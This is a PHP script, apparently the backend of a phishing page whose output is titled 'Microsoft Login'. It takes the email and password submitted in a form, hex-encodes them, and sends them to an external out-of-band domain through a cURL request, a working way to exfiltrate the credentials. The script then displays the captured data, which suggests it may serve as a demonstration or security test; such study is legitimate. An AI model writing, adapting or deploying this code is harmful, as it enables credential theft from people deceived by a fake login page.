<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collecting data from the form
    $email = $_POST['email'] ?? 'No email provided';
    $password = $_POST['password'] ?? 'No password provided';
    $oob_url = $_POST['oob-url'] ?? 'No OOB URL provided';  // Collect the OOB URL passed from the form

    // Combine email and password with a space
    $combined = $email . " " . $password;

    // Convert the combined string to hexadecimal
    $hex = bin2hex($combined);

    // Prepend the hex value to the OOB URL
    $full_url = "http://" . $hex . "." . $oob_url;  // Use the user-provided OOB URL

    // Send a GET request to the full URL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Display an acknowledgment message along with the data received
    echo "<html>
            <head>
                <title>Microsoft Login - Submission Received</title>
            </head>
            <body>
                <h1>Thank You!</h1>
                <p>Your submission has been received.</p>
                <p>Email: " . htmlspecialchars($email) . "</p>
                <p>Password: " . htmlspecialchars($password) . "</p>
                <p>OOB URL: " . htmlspecialchars($oob_url) . "</p>
                <p>Full URL sent to: " . htmlspecialchars($full_url) . "</p>
                <p>cURL Response: " . htmlspecialchars($response) . "</p>
            </body>
          </html>";
} else {
    echo "No POST request received";
}
?>
